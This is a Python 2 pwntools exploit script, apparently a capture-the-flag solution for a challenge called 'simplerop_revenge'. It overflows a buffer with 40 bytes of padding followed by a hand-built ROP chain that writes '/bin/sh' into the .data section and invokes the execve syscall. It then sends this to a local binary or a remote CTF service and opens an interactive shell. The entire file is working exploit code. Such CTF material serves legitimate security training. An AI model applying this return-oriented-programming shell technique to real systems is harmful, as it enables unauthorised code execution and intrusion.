import pwn
import pwnlib
from pwn import p64
from pwnlib import args
from struct import pack

pwn.context.arch = 'amd64'

def build_chain():
    # Padding goes here
    p = ''

    p += pack('<Q', 0x0000000000478516) # pop rax ; pop rdx ; pop rbx ; ret
    p += pack('<Q', 0x00000000006c9a18) # @ .data - 0x8
    p += '/bin/sh\x00'
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x0000000000442d65) # mov qword ptr [rax + 8], rdx ; ret
    # rdi = @.data = address of '/bin/sh'
    p += pack('<Q', 0x0000000000401456) # pop rdi ; ret
    p += pack('<Q', 0x00000000006c9a20) # @ .data
    # rsi = 0
    p += pack('<Q', 0x0000000000401577) # pop rsi ; ret
    p += pack('<Q', 0x0000000000000000) # 0
    # rax = 0x3b
    p += pack('<Q', 0x0000000000478516) # pop rax ; pop rdx ; pop rbx ; ret
    p += pack('<Q', 0x000000000000003b) # 0x3b
    p += pack('<Q', 0x0000000000000000) # 0
    p += pack('<Q', 0x4141414141414141) # padding
    p += pack('<Q', 0x00000000004671b5) # syscall ; ret

    return p

if __name__ == '__main__':
    if args.args['REMOTE']:
        p = pwn.connect('csie.ctf.tw', 10130)
    else:
        p = pwn.process('./simplerop_revenge-a94df6520a6dbe478b5a03fd31e0b0614bcdf08d')

    print p.recvuntil(':')

    ropchain = build_chain()
    payload = 'a'*(32+8) + ropchain
    print len(payload)
    p.send(payload)
    p.interactive()
